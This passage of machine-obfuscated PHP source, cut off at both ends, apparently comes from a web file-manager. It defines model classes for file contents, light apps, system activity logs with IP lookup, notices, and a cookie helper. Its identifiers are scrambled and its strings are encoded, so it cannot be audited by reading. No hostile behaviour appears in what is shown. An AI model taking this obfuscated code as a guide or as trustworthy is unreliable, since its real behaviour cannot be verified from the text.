$¼´³åéÉ[$ÈöˆÈ‹[$™ôÀ¹‘Ê[1858]][$™ôÀ¹‘Ê[1644]]]; } } unset($ÈöˆÈ‹); } private function _listAppendMeta(&$ˆ¿´ã®û) { $˜şÍ‡ñÎ =& $_SERVER[Æ š¦İÈ]; $øô³Ó À = array_unique(array_to_keyvalue($ˆ¿´ã®û, $˜şÍ‡ñÎ[12], $˜şÍ‡ñÎ[1848])); $øô³Ó À = array_remove_value($øô³Ó À, $˜şÍ‡ñÎ[192]); if (!$øô³Ó À) { return; } foreach ($ˆ¿´ã®û as $ğ¯ğ×õä) { if (isset($ğ¯ğ×õä[$˜şÍ‡ñÎ[1858]])) { $øô³Ó À[] = $ğ¯ğ×õä[$˜şÍ‡ñÎ[1858]][$˜şÍ‡ñÎ[1848]]; } } $·ûç× = $this->metaList($øô³Ó À); if (!$·ûç×) { return !1; } foreach ($ˆ¿´ã®û as &$ğ¯ğ×õä) { $ğ¯ğ×õä[$˜şÍ‡ñÎ[467]] = $·ûç×[$ğ¯ğ×õä[$˜şÍ‡ñÎ[1848]]]; if (isset($ğ¯ğ×õä[$˜şÍ‡ñÎ[1858]])) { $ğ¯ğ×õä[$˜şÍ‡ñÎ[1858]][$˜şÍ‡ñÎ[467]] = $·ûç×[$ğ¯ğ×õä[$˜şÍ‡ñÎ[1858]][$˜şÍ‡ñÎ[1848]]]; } } unset($ğ¯ğ×õä); } private function metaList($Ô¥™Ö®—) { $¦êõøèô =& $_SERVER[Æ š¦İÈ]; if (!$Ô¥™Ö®—) { return array(); } $õİÑü¨— = array($¦êõøèô[1848] => array($¦êõøèô[7], $Ô¥™Ö®—)); $¯¬êØ«™ = Model($¦êõøèô[1859])->where($õİÑü¨—)->select(); $¯¬êØ«™ = array_to_keyvalue_group($¯¬êØ«™, $¦êõøèô[1848]); foreach ($¯¬êØ«™ as $èÆğ’ğ¥ => $õé ¡–Š) { $šÅï°âÏ = array(); foreach ($õé ¡–Š as $ùÄ£‰§¯) { $šÅï°âÏ[$ùÄ£‰§¯[$¦êõøèô[95]]] = $ùÄ£‰§¯[$¦êõøèô[371]]; } $¯¬êØ«™[$èÆğ’ğ¥] = $šÅï°âÏ; } return $¯¬êØ«™ ? $¯¬êØ«™ : array(); } } class FileContentModel extends ModelBase { protected $tableName = "\x69\157\x5f\146\151\x6c\145\137\x63\157\x6e\x74\145\156\x74\x73"; protected $dataAuto = array(array("\143\x72\x65\141\164\145\x54\x69\x6d\x65", "\x74\151\155\145", "\x69\x6e\x73\145\x72\164", "\146\165\156\143\164\x69\x6f\x6e")); } goto E©½„ˆ“—§; bªÌÅÓ©è: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\56\x4c\151\147\150\x74\x41\x70\x70"; public $modelType = "\x53\171\x73\x74\145\x6d\x4f\x70\x74\151\x6f\x6e"; public $field = array("\156\141\155\145", "\147\162\157\x75\x70", "\144\145\163\x63", "\x63\x6f\156\x74\x65\156\164"); public function listData($âôÌÕ´ = false, $Ğéë™ = "\155\157\x64\x69\x66\171\x54\x69\155\x65", $ÂáÄø™ = true) { return parent::listData($âôÌÕ´, $Ğéë™, $ÂáÄø™); } public function remove($ãÃ³•) { $¥œ·Ôˆ = $this->findByName($ãÃ³•); if (!$¥œ·Ôˆ) { return !1; } return parent::remove($¥œ·Ôˆ[$_SERVER[Æ š¦İÈ][403]]); } public function add($ËÛÅù’˜) { if ($this->findByName($ËÛÅù’˜[$_SERVER[Æ š¦İÈ][32]])) { return !1; } return parent::insert($ËÛÅù’˜); } public function update($ãëæÍ¯ø, $ı¦Æ¢¯) { $±Ò¢³ù =& $_SERVER[Æ š¦İÈ]; $­éÅ´ÏÖ = $this->findByName($ãëæÍ¯ø); $µ ¸£§È = $this->findByName($ı¦Æ¢¯[$±Ò¢³ù[32]]); if (!$­éÅ´ÏÖ || $µ ¸£§È && $µ ¸£§È[$±Ò¢³ù[403]] != $­éÅ´ÏÖ[$±Ò¢³ù[403]]) { return !1; } return parent::update($­éÅ´ÏÖ[$±Ò¢³ù[403]], $ı¦Æ¢¯); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\x73\x74\145\155\x5f\x6c\157\147"; protected $dataAuto = array(array("\143\162\145\x61\164\x65\x54\151\x6d\x65", "\x74\x69\x6d\145", "\151\156\x73\x65\x72\164", "\146\x75\x6e\143\164\x69\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ÃïÆÑüÉ =& $_SERVER[Æ š¦İÈ]; return array($ÃïÆÑüÉ[2131] => LNG($ÃïÆÑüÉ[2132]), $ÃïÆÑüÉ[2133] => LNG($ÃïÆÑüÉ[2134]), $ÃïÆÑüÉ[1755] => LNG($ÃïÆÑüÉ[2135]), $ÃïÆÑüÉ[2136] => LNG($ÃïÆÑüÉ[2137]), $ÃïÆÑüÉ[2138] => LNG($ÃïÆÑüÉ[2139]), $ÃïÆÑüÉ[2140] => LNG($ÃïÆÑüÉ[2141]), $ÃïÆÑüÉ[2142] => LNG($ÃïÆÑüÉ[2143]), $ÃïÆÑüÉ[1785] => LNG($ÃïÆÑüÉ[2143]), $ÃïÆÑüÉ[1786] => LNG($ÃïÆÑüÉ[2144]), $ÃïÆÑüÉ[2145] => LNG($ÃïÆÑüÉ[2146]), $ÃïÆÑüÉ[2147] => LNG($ÃïÆÑüÉ[2148]), $ÃïÆÑüÉ[2149] => LNG($ÃïÆÑüÉ[2150]), $ÃïÆÑüÉ[2151] => LNG($ÃïÆÑüÉ[2152]), $ÃïÆÑüÉ[1783] => LNG($ÃïÆÑüÉ[2153]), $ÃïÆÑüÉ[2154] => LNG($ÃïÆÑüÉ[2155]), $ÃïÆÑüÉ[1790] => LNG($ÃïÆÑüÉ[2156]), $ÃïÆÑüÉ[2157] => LNG($ÃïÆÑüÉ[2158]), $ÃïÆÑüÉ[2159] => LNG($ÃïÆÑüÉ[2160]), $ÃïÆÑüÉ[2161] => LNG($ÃïÆÑüÉ[2162]), $ÃïÆÑüÉ[2163] => LNG($ÃïÆÑüÉ[2164]), $ÃïÆÑüÉ[1793] => LNG($ÃïÆÑüÉ[2165]), $ÃïÆÑüÉ[1794] => LNG($ÃïÆÑüÉ[2166]), $ÃïÆÑüÉ[2167] => LNG($ÃïÆÑüÉ[2168]), $ÃïÆÑüÉ[2169] => LNG($ÃïÆÑüÉ[2170]), $ÃïÆÑüÉ[2171] => LNG($ÃïÆÑüÉ[2172]), $ÃïÆÑüÉ[1788] => LNG($ÃïÆÑüÉ[2173]), $ÃïÆÑüÉ[2174] => LNG($ÃïÆÑüÉ[2175]), $ÃïÆÑüÉ[1787] => LNG($ÃïÆÑüÉ[2176]), $ÃïÆÑüÉ[2177] => LNG($ÃïÆÑüÉ[2178]), $ÃïÆÑüÉ[2179] => LNG($ÃïÆÑüÉ[2180]), $ÃïÆÑüÉ[2181] => LNG($ÃïÆÑüÉ[2182]), $ÃïÆÑüÉ[2183] => LNG($ÃïÆÑüÉ[2183]), $ÃïÆÑüÉ[2184] => LNG($ÃïÆÑüÉ[1759]), $ÃïÆÑüÉ[2185] => LNG($ÃïÆÑüÉ[2186]), $ÃïÆÑüÉ[2187] => LNG($ÃïÆÑüÉ[2188]), $ÃïÆÑüÉ[2189] => LNG($ÃïÆÑüÉ[2190]), $ÃïÆÑüÉ[2191] => LNG($ÃïÆÑüÉ[2192]), $ÃïÆÑüÉ[2193] => LNG($ÃïÆÑüÉ[2194]), $ÃïÆÑüÉ[2195] => LNG($ÃïÆÑüÉ[2195]), $ÃïÆÑüÉ[2196] => LNG($ÃïÆÑüÉ[2197]), $ÃïÆÑüÉ[2198] => LNG($ÃïÆÑüÉ[2199]), $ÃïÆÑüÉ[2200] => LNG($ÃïÆÑüÉ[2201]), $ÃïÆÑüÉ[2202] => LNG($ÃïÆÑüÉ[2203]), $ÃïÆÑüÉ[2204] => LNG($ÃïÆÑüÉ[2205]), $ÃïÆÑüÉ[2206] => LNG($ÃïÆÑüÉ[2207])); } private function typeFile() { $ÇÏ¼Ñè‚ =& $_SERVER[Æ š¦İÈ]; $”óÃ¹”‡ = array($ÇÏ¼Ñè‚[1790] => array($ÇÏ¼Ñè‚[1791]), $ÇÏ¼Ñè‚[2149] => array($ÇÏ¼Ñè‚[2208]), $ÇÏ¼Ñè‚[2151] => array($ÇÏ¼Ñè‚[2209]), $ÇÏ¼Ñè‚[1783] => array($ÇÏ¼Ñè‚[1784]), $ÇÏ¼Ñè‚[2159] => array(), $ÇÏ¼Ñè‚[2161] => array(), $ÇÏ¼Ñè‚[2163] => array(), $ÇÏ¼Ñè‚[1793] => array($ÇÏ¼Ñè‚[1795]), $ÇÏ¼Ñè‚[1794] => array($ÇÏ¼Ñè‚[1795]), $ÇÏ¼Ñè‚[2167] => array($ÇÏ¼Ñè‚[2210]), $ÇÏ¼Ñè‚[2169] => array($ÇÏ¼Ñè‚[2210]), $ÇÏ¼Ñè‚[2171] => array($ÇÏ¼Ñè‚[2211]), $ÇÏ¼Ñè‚[2157] => array($ÇÏ¼Ñè‚[2212]), $ÇÏ¼Ñè‚[1788] => array($ÇÏ¼Ñè‚[2213]), $ÇÏ¼Ñè‚[2174] => array($ÇÏ¼Ñè‚[2214]), $ÇÏ¼Ñè‚[1787] => array($ÇÏ¼Ñè‚[1789])); return $”óÃ¹”‡; } private function typeAll() { $…·£üƒ =& $_SERVER[Æ š¦İÈ]; $åÖºü• = $this->typeList; $ç°¾‚¼‡ = array_filter($this->typeFile()); foreach ($ç°¾‚¼‡ as $ò¿‘àñû => $÷‡™Ñå) { $åÖºü•[$÷‡™Ñå[0]] = $åÖºü•[$ò¿‘àñû]; } $åÖºü•[$…·£üƒ[1795]] = LNG($…·£üƒ[2215]); $åÖºü•[$…·£üƒ[2210]] = LNG($…·£üƒ[2216]); return $åÖºü•; } public function addLog($ıÚÁŒó—, $ƒîÀ¾ = array()) { $¯™™²Ö =& $_SERVER[Æ š¦İÈ]; if (!isset($this->typeList[$ıÚÁŒó—])) { return; } $î´şôÄş = defined($¯™™²Ö[476]) && USER_ID ? USER_ID : (isset($ƒîÀ¾[$¯™™²Ö[1644]]) ? $ƒîÀ¾[$¯™™²Ö[1644]] : 0); if (!$î´şôÄş) { $î´şôÄş = (int) Session::get($¯™™²Ö[1944]); } $”èşøİĞ = get_client_ip(); if (!$ƒîÀ¾ || strlen(json_encode($ƒîÀ¾)) >= 1024) { $ƒîÀ¾ = array($¯™™²Ö[2217] => $”èşøİĞ); } else { if (is_array($ƒîÀ¾)) { $ƒîÀ¾[$¯™™²Ö[2217]] = $”èşøİĞ; } else { $ƒîÀ¾ = array($¯™™²Ö[1182] => $ƒîÀ¾, $¯™™²Ö[2217] => $”èşøİĞ); } } $ƒîÀ¾ = array($¯™™²Ö[1634] => Session::sign(), $¯™™²Ö[1635] => $î´şôÄş, $¯™™²Ö[33] => $ıÚÁŒó—, $¯™™²Ö[1637] => json_encode($ƒîÀ¾)); parent::add($ƒîÀ¾); } public function remove($ÅóàÇÑ) { $this->where(array($_SERVER[Æ š¦İÈ][422] => $ÅóàÇÑ))->delete(); } private function _makeOrder($µä»áµ± = '') { $„Û²¾Ü¬ =& $_SERVER[Æ š¦İÈ]; $º§òîÙÕ = $„Û²¾Ü¬[195]; $Øêñî = array($„Û²¾Ü¬[450] => $„Û²¾Ü¬[451], $„Û²¾Ü¬[452] => $„Û²¾Ü¬[453]); $âÂÀ¹ËÜ = Input::get($„Û²¾Ü¬[458], $„Û²¾Ü¬[7], $„Û²¾Ü¬[1976], array($„Û²¾Ü¬[1902], $„Û²¾Ü¬[452])); $âÂÀ¹ËÜ = $Øêñî[$âÂÀ¹ËÜ]; $µä»áµ± = $µä»áµ± . "{$º§òîÙÕ}\40{$âÂÀ¹ËÜ}"; return $this->order($µä»áµ±); } public function get($¼ğÄÓµ¬ = '') { $¬†³ˆ«î =& $_SERVER[Æ š¦İÈ]; if (!$¼ğÄÓµ¬) { show_json(array()); } $Ù‡åŸÃÍ = array(); if ($¼ğÄÓµ¬[$¬†³ˆ«î[1644]]) { $Ù‡åŸÃÍ[$¬†³ˆ«î[1644]] = $¼ğÄÓµ¬[$¬†³ˆ«î[1644]]; } if (isset($¼ğÄÓµ¬[$¬†³ˆ«î[758]])) { $’º—ß â = $¼ğÄÓµ¬[$¬†³ˆ«î[758]]; $¤ƒ–‰‡­ = isset($¼ğÄÓµ¬[$¬†³ˆ«î[498]]) ? $¼ğÄÓµ¬[$¬†³ˆ«î[498]] : time(); $Ù‡åŸÃÍ[$¬†³ˆ«î[195]] = array($¬†³ˆ«î[330], array($’º—ß â, $¤ƒ–‰‡­)); } if ($¼ğÄÓµ¬[$¬†³ˆ«î[33]]) { $ê±§º = explode($¬†³ˆ«î[50], $¼ğÄÓµ¬[$¬†³ˆ«î[33]]); $¬´ï†£ = $this->typeFile(); $Ñ„¢±ˆ‹ = array(); foreach ($ê±§º as $ØÉç·º) { $Ñ„¢±ˆ‹[] = $ØÉç·º; if (isset($¬´ï†£[$ØÉç·º])) { $Ñ„¢±ˆ‹ = array_merge($Ñ„¢±ˆ‹, $¬´ï†£[$ØÉç·º]); } } $Ñ„¢±ˆ‹ = array_unique($Ñ„¢±ˆ‹); if ($Ñ„¢±ˆ‹) { $Ù‡åŸÃÍ[$¬†³ˆ«î[33]] = array($¬†³ˆ«î[7], $Ñ„¢±ˆ‹); } } else { $Ù‡åŸÃÍ[$¬†³ˆ«î[33]] = array($¬†³ˆ«î[2218], $¬†³ˆ«î[2219]); } if (!empty($¼ğÄÓµ¬[$¬†³ˆ«î[2217]])) { $Ù‡åŸÃÍ[$¬†³ˆ«î[453]] = array($¬†³ˆ«î[380], "\45{$¼ğÄÓµ¬[$¬†³ˆ«î[2217]]}\45"); } $ÕÙºŞ„ù = $this->_makeOrder()->where($Ù‡åŸÃÍ)->selectPage(); if (empty($ÕÙºŞ„ù[$¬†³ˆ«î[366]])) { show_json(array(), !0, $ÕÙºŞ„ù[$¬†³ˆ«î[363]]); } $ÕÙºŞ„ù[$¬†³ˆ«î[366]] = $this->logList($ÕÙºŞ„ù[$¬†³ˆ«î[366]]); return $ÕÙºŞ„ù; } private function ipAddress(&$ªĞ½‚ÚÖ) { $íŞ¬Ò²È =& $_SERVER[Æ š¦İÈ]; if (!empty($ªĞ½‚ÚÖ[$íŞ¬Ò²È[2217]])) { $«Õ†îğ” = IpLocation::get($ªĞ½‚ÚÖ[$íŞ¬Ò²È[2217]]); } else { $«Õ†îğ” = LNG($íŞ¬Ò²È[2220]); } $ªĞ½‚ÚÖ[$íŞ¬Ò²È[2221]] = $«Õ†îğ”; } private function descZipDownload($˜ùìŞĞĞ, &$ªúºÜªÑ) { $¿ÔŸæ± =& $_SERVER[Æ š¦İÈ]; if (!isset($˜ùìŞĞĞ[$¿ÔŸæ±[2222]])) { return; } $ç¡ ‡á = json_decode($˜ùìŞĞĞ[$¿ÔŸæ±[2222]], !0); foreach ($ç¡ ‡á as $³ñ¢ëç) { try { $ëüŞŞ³Ç = IO::infoFull($³ñ¢ëç[$¿ÔŸæ±[78]]); } catch (Exception $Àª¨Î‹‰) { continue; } $˜ùìŞĞĞ[$¿ÔŸæ±[78]] = $³ñ¢ëç[$¿ÔŸæ±[78]]; $ªúºÜªÑ[] = $˜ùìŞĞĞ[$¿ÔŸæ±[405]] = $ëüŞŞ³Ç[$¿ÔŸæ±[405]]; $ªúºÜªÑ[] = $˜ùìŞĞĞ[$¿ÔŸæ±[2030]] = $ëüŞŞ³Ç[$¿ÔŸæ±[500]]; break; } return $˜ùìŞĞĞ; } private function getSourceList(&$ƒËÄ°») { $ó«É„æå =& $_SERVER[Æ š¦İÈ]; $àá°ıÒ¦ = array(); foreach ($ƒËÄ°» as $Îİæ¥†Œ => $¾üÕ¥ü¨) { $¬Ò‡ª‰ã = json_decode($¾üÕ¥ü¨[$ó«É„æå[453]], !0); if ($¾üÕ¥ü¨[$ó«É„æå[33]] == $ó«É„æå[1786]) { $¬Ò‡ª‰ã = $this->descZipDownload($¬Ò‡ª‰ã, $àá°ıÒ¦); $ƒËÄ°»[$Îİæ¥†Œ][$ó«É„æå[453]] = json_encode($¬Ò‡ª‰ã); continue; } if (strpos($¾üÕ¥ü¨[$ó«É„æå[33]], $ó«É„æå[2032]) !== 0) { if (!isset($¬Ò‡ª‰ã[$ó«É„æå[78]]) || strpos($¾üÕ¥ü¨[$ó«É„æå[33]], $ó«É„æå[2223]) !== 0) { continue; } try { $óÎí = IO::infoFull($¬Ò‡ª‰ã[$ó«É„æå[78]]); } catch (Exception $ÒÅ¨Ù) { continue; } $àá°ıÒ¦[] = $¬Ò‡ª‰ã[$ó«É„æå[405]] = $óÎí[$ó«É„æå[405]]; $àá°ıÒ¦[] = $¬Ò‡ª‰ã[$ó«É„æå[2030]] = $óÎí[$ó«É„æå[500]]; $ƒËÄ°»[$Îİæ¥†Œ][$ó«É„æå[453]] = json_encode($¬Ò‡ª‰ã); continue; } $àá°ıÒ¦[] = $¬Ò‡ª‰ã[$ó«É„æå[405]]; $àá°ıÒ¦[] = $¬Ò‡ª‰ã[$ó«É„æå[2030]]; if ($¬Ò‡ª‰ã[$ó«É„æå[33]] == $ó«É„æå[553]) { $àá°ıÒ¦[] = $¬Ò‡ª‰ã[$ó«É„æå[453]][$ó«É„æå[1149]]; $àá°ıÒ¦[] = $¬Ò‡ª‰ã[$ó«É„æå[453]][$ó«É„æå[1150]]; } if ($¬Ò‡ª‰ã[$ó«É„æå[33]] == $ó«É„æå[2039]) { $àá°ıÒ¦[] = $¬Ò‡ª‰ã[$ó«É„æå[453]][$ó«É„æå[405]]; } } if (!$àá°ıÒ¦) { return array(); } return Model($ó«É„æå[822])->sourceListInfo($àá°ıÒ¦, !0); } private function logList($‚ñ™›–) { $°ª¡‹€‰ =& $_SERVER[Æ š¦İÈ]; $ˆÔªùã… = array_to_keyvalue($‚ñ™›–, $°ª¡‹€‰[12], $°ª¡‹€‰[1644]); $š¥¦¯ğé = Model($°ª¡‹€‰[540])->userListInfo(array_unique($ˆÔªùã…)); $Ã»»îÓç = $this->getSourceList($‚ñ™›–); $ìôæ••´ = $this->typeAll(); $ú‚±Óâ¹ = array(); $¢ñûğŒ¬ = array(); foreach ($‚ñ™›– as $ô¢’üìí => $ü¼„¢‘) { $òéø¼ëØ = $ü¼„¢‘[$°ª¡‹€‰[33]]; $­ìÅ ï¶ = isset($š¥¦¯ğé[$ü¼„¢‘[$°ª¡‹€‰[1644]]]) ? $š¥¦¯ğé[$ü¼„¢‘[$°ª¡‹€‰[1644]]] : !1; $ÈÇ¹Ñ±• = strpos($òéø¼ëØ, $°ª¡‹€‰[2224]) === 0 ? LNG($°ª¡‹€‰[2225]) : LNG($°ª¡‹€‰[2220]); $ü¼„¢‘[$°ª¡‹€‰[32]] = isset($­ìÅ ï¶[$°ª¡‹€‰[32]]) ? $­ìÅ ï¶[$°ª¡‹€‰[32]] : LNG($°ª¡‹€‰[2220]); $ü¼„¢‘[$°ª¡‹€‰[2080]] = isset($­ìÅ ï¶[$°ª¡‹€‰[2080]]) ? $­ìÅ ï¶[$°ª¡‹€‰[2080]] : $°ª¡‹€‰[12]; $ü¼„¢‘[$°ª¡‹€‰[1544]] = isset($ìôæ••´[$òéø¼ëØ]) ? $ìôæ••´[$òéø¼ëØ] : $ÈÇ¹Ñ±•; $ü¼„¢‘[$°ª¡‹€‰[1975]] = $­ìÅ ï¶; $Ñáñ­ØÊ = json_decode($ü¼„¢‘[$°ª¡‹€‰[453]], !0); $ü¼„¢‘[$°ª¡‹€‰[2217]] = isset($Ñáñ­ØÊ[$°ª¡‹€‰[2217]]) ? $Ñáñ­ØÊ[$°ª¡‹€‰[2217]] : $°ª¡‹€‰[12]; $ü¼„¢‘[$°ª¡‹€‰[2221]] = IpLocation::get($ü¼„¢‘[$°ª¡‹€‰[2217]]); if (strpos($òéø¼ëØ, $°ª¡‹€‰[2032]) === 0 || isset($Ñáñ­ØÊ[$°ª¡‹€‰[2030]])) { $Ñáñ­ØÊ[$°ª¡‹€‰[87]] = $Ã»»îÓç[$Ñáñ­ØÊ[$°ª¡‹€‰[405]]]; $Ñáñ­ØÊ[$°ª¡‹€‰[2044]] = $Ã»»îÓç[$Ñáñ­ØÊ[$°ª¡‹€‰[2030]]]; if ($Ñáñ­ØÊ[$°ª¡‹€‰[33]] == $°ª¡‹€‰[553]) { $Ñáñ­ØÊ[$°ª¡‹€‰[453]][$°ª¡‹€‰[1149]] = $Ã»»îÓç[$Ñáñ­ØÊ[$°ª¡‹€‰[453]][$°ª¡‹€‰[1149]]]; $Ñáñ­ØÊ[$°ª¡‹€‰[453]][$°ª¡‹€‰[1150]] = $Ã»»îÓç[$Ñáñ­ØÊ[$°ª¡‹€‰[453]][$°ª¡‹€‰[1150]]]; } if ($Ñáñ­ØÊ[$°ª¡‹€‰[33]] == $°ª¡‹€‰[2039]) { $Ñáñ­ØÊ[$°ª¡‹€‰[453]][$°ª¡‹€‰[405]] = $Ã»»îÓç[$Ñáñ­ØÊ[$°ª¡‹€‰[453]][$°ª¡‹€‰[405]]]; } if ($Ñáñ­ØÊ[$°ª¡‹€‰[33]] == $°ª¡‹€‰[1781]) { $Ñáñ­ØÊ[$°ª¡‹€‰[2044]] = $Ñáñ­ØÊ[$°ª¡‹€‰[87]]; $Ñáñ­ØÊ[$°ª¡‹€‰[2030]] = $Ñáñ­ØÊ[$°ª¡‹€‰[2044]][$°ª¡‹€‰[405]]; $Ñáñ­ØÊ[$°ª¡‹€‰[87]] = !1; $Ñáñ­ØÊ[$°ª¡‹€‰[405]] = $°ª¡‹€‰[12]; } if ($Ñáñ­ØÊ[$°ª¡‹€‰[87]] && $Ñáñ­ØÊ[$°ª¡‹€‰[87]][$°ª¡‹€‰[414]] == $°ª¡‹€‰[1265]) { $¢ñûğŒ¬[] = $ü¼„¢‘[$°ª¡‹€‰[403]]; unset($‚ñ™›–[$ô¢’üìí]); continue; } if ($Ñáñ­ØÊ[$°ª¡‹€‰[2044]] && $Ñáñ­ØÊ[$°ª¡‹€‰[2044]][$°ª¡‹€‰[414]] == $°ª¡‹€‰[1265]) { $¢ñûğŒ¬[] = $ü¼„¢‘[$°ª¡‹€‰[403]]; unset($‚ñ™›–[$ô¢’üìí]); continue; } } $ü¼„¢‘[$°ª¡‹€‰[453]] = $Ñáñ­ØÊ; unset($ü¼„¢‘[$°ª¡‹€‰[2226]]); $ú‚±Óâ¹[] = $ü¼„¢‘; } $this->clearSystemPathLog($¢ñûğŒ¬); return $ú‚±Óâ¹; } private function clearSystemPathLog($ÛÄö©Ğ‰) { $ŸŒÕâúÈ =& $_SERVER[Æ š¦İÈ]; if (count($ÛÄö©Ğ‰) == 0) { return; } $Å“á¡Ô = array($ŸŒÕâúÈ[403] => array($ŸŒÕâúÈ[7], array_unique($ÛÄö©Ğ‰))); $this->where($Å“á¡Ô)->delete(); } public function deviceList($…ùŞ•¢ş, $ÜŞÜ´õ– = 0) { $¢ÔÛÂ =& $_SERVER[Æ š¦İÈ]; $­£…ö­ = array($¢ÔÛÂ[1644] => $…ùŞ•¢ş, $¢ÔÛÂ[195] => array($¢ÔÛÂ[1005], $ÜŞÜ´õ–), $¢ÔÛÂ[33] => $¢ÔÛÂ[1755]); $öÕŠ©ª± = array(); $ †º°Ç‡ = $this->field($¢ÔÛÂ[2227])->where($­£…ö­)->order($¢ÔÛÂ[2042])->limit(50)->select(); foreach ($ †º°Ç‡ as $ÄŞÚ„Î« => $üÈˆûÉ¥) { if ($ÄŞÚ„Î« > 0 && abs($üÈˆûÉ¥[$¢ÔÛÂ[195]] - $ †º°Ç‡[$ÄŞÚ„Î« - 1][$¢ÔÛÂ[195]]) < 5) { continue; } $Ø¡¸şèù = json_decode($üÈˆûÉ¥[$¢ÔÛÂ[453]], !0); $üÈˆûÉ¥[$¢ÔÛÂ[2217]] = isset($Ø¡¸şèù[$¢ÔÛÂ[2217]]) ? $Ø¡¸şèù[$¢ÔÛÂ[2217]] : $¢ÔÛÂ[12]; unset($Ø¡¸şèù[$¢ÔÛÂ[2217]]); $¥äÃøÙ = $this->deviceType($Ø¡¸şèù[$¢ÔÛÂ[2033]]); if (isset($öÕŠ©ª±[$¥äÃøÙ])) { continue; } $üÈˆûÉ¥[$¢ÔÛÂ[2221]] = IpLocation::get($üÈˆûÉ¥[$¢ÔÛÂ[2217]]); $üÈˆûÉ¥[$¢ÔÛÂ[453]] = $Ø¡¸şèù; $öÕŠ©ª±[$¥äÃøÙ] = $üÈˆûÉ¥; } return array_values($öÕŠ©ª±); } public function deviceType($Ô÷ƒÒş¶) { return $Ô÷ƒÒş¶; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\x6d\56\156\157\x74\151\143\145\114\x69\x73\x74"; public $field = array("\156\x61\x6d\x65", "\143\x6f\x6e\x74\145\156\164", "\141\165\164\150", "\155\157\x64\x65", "\x74\151\x6d\145", "\x74\171\160\145", "\x6c\x65\166\x65\x6c", "\145\156\141\142\x6c\145", "\x73\157\x72\164"); public function listData($ÓŒà†±Á = false, $û‹ÄüÀÚ = "\163\157\x72\164", $øĞåŸ½ = false) { return parent::listData($ÓŒà†±Á, $û‹ÄüÀÚ, $øĞåŸ½); } public function add($ø­ššÔï) { $şçæ¸´‡ =& $_SERVER[Æ š¦İÈ]; $Ì¢Õ ßµ = time(); if ($ø­ššÔï[$şçæ¸´‡[16]] == $şçæ¸´‡[2228]) { $Ì¢Õ ßµ = strtotime($ø­ššÔï[$şçæ¸´‡[198]]); } $ø­ššÔï[$şçæ¸´‡[198]] = $Ì¢Õ ßµ; return parent::insert($ø­ššÔï); } public function update($ı’¦÷šŸ, $œê™ˆá) { $ß×ØÛ¹ =& $_SERVER[Æ š¦İÈ]; $Ûò»† = $this->listData($ı’¦÷šŸ); if (!$Ûò»†) { return !1; } $Ë‰î—‡ = time(); if ($œê™ˆá[$ß×ØÛ¹[16]] == $ß×ØÛ¹[2228]) { $Ë‰î—‡ = strtotime($œê™ˆá[$ß×ØÛ¹[198]]); } $œê™ˆá[$ß×ØÛ¹[198]] = $Ë‰î—‡; return parent::update($ı’¦÷šŸ, $œê™ˆá); } public function remove($„‹û†ŒŞ) { $‰ÕÎ›æ = $this->listData($„‹û†ŒŞ); if (!$‰ÕÎ›æ || $‰ÕÎ›æ[$_SERVER[Æ š¦İÈ][1265]]) { return !1; } return parent::remove($„‹û†ŒŞ); } public function sort($³ï‚ğµ¡, $Ê­‹ã²Ø) { return parent::update($³ï‚ğµ¡, $Ê­‹ã²Ø); } public function enable($†‡åğÊÚ, $úşóï†«) { return parent::update($†‡åğÊÚ, array($_SERVER[Æ š¦İÈ][2229] => $úşóï†«)); } private function initUserOption() { $Í¢õúŒï =& $_SERVER[Æ š¦İÈ]; $this->optionType = $Í¢õúŒï[2230]; $this->modelType = $Í¢õúŒï[2231]; $this->field = array($Í¢õúŒï[2232], $Í¢õúŒï[32], $Í¢õúŒï[198], $Í¢õúŒï[33], $Í¢õúŒï[2233], $Í¢õúŒï[747], $Í¢õúŒï[190]); } public function userNoticeGet($åÉ±ìÌ = false) { $this->initUserOption(); return parent::listData($åÉ±ìÌ, $_SERVER[Æ š¦İÈ][403], !0); } public function userNoticeAdd($ÏÄæêÎ) { $Õ½€½Å =& $_SERVER[Æ š¦İÈ]; $this->initUserOption(); $Î»äô¸¬ = $this->findByKey($Õ½€½Å[2232], $ÏÄæêÎ[$Õ½€½Å[403]]); if ($Î»äô¸¬) { return !0; } $¾ù÷æ = array($Õ½€½Å[2232] => $ÏÄæêÎ[$Õ½€½Å[403]], $Õ½€½Å[32] => $ÏÄæêÎ[$Õ½€½Å[32]], $Õ½€½Å[198] => $ÏÄæêÎ[$Õ½€½Å[198]], $Õ½€½Å[33] => isset($ÏÄæêÎ[$Õ½€½Å[33]]) ? $ÏÄæêÎ[$Õ½€½Å[33]] : 1, $Õ½€½Å[2233] => isset($ÏÄæêÎ[$Õ½€½Å[2233]]) ? $ÏÄæêÎ[$Õ½€½Å[2233]] : 0, $Õ½€½Å[747] => 0, $Õ½€½Å[190] => 0); return parent::insert($¾ù÷æ); } public function userNoticeEdit($ËÈë·åå, $û™´ËüÈ) { $this->initUserOption(); return parent::update($ËÈë·åå, $û™´ËüÈ); } } goto FàŒÁÑÇä…; bÆö°‘Ó³Ã: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($¹‹¯›À = '', $õÇ’ıöÙ = 0) { if (is_string($¹‹¯›À) && $¹‹¯›À != $_SERVER[Æ š¦İÈ][12]) { $this->prefix = $¹‹¯›À; } if (is_numeric($õÇ’ıöÙ) && $õÇ’ıöÙ > 0) { $this->expire = $õÇ’ıöÙ; } } public static function getInstance() { static $úŸÀÄÎ¶; if ($úŸÀÄÎ¶ === null) { $úŸÀÄÎ¶ = new self(); } return $úŸÀÄÎ¶; } private static $cookieDisable = false; public static function disable($şÒÉ‹ˆÇ) { self::$cookieDisable = $şÒÉ‹ˆÇ; } private static $sameCookieSet = array(); public static function set($ğšô»…Ğ, $…Ï¶ãÄ°, $µ˜ê¬Î = 0, $Éåİ¡“± = false, $‡îáÇËÀ = false) { $’éñ”×® =& $_SERVER[Æ š¦İÈ]; if (self::$cookieDisable) { return; } if (!$µ˜ê¬Î) { $µ˜ê¬Î = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$ğšô»…Ğ]) && self::$sameCookieSet[$ğšô»…Ğ] == $…Ï¶ãÄ° . $µ˜ê¬Î) { return; } self::$sameCookieSet[$ğšô»…Ğ] = $…Ï¶ãÄ° . $µ˜ê¬Î; if (!$‡îáÇËÀ) { $‡îáÇËÀ = 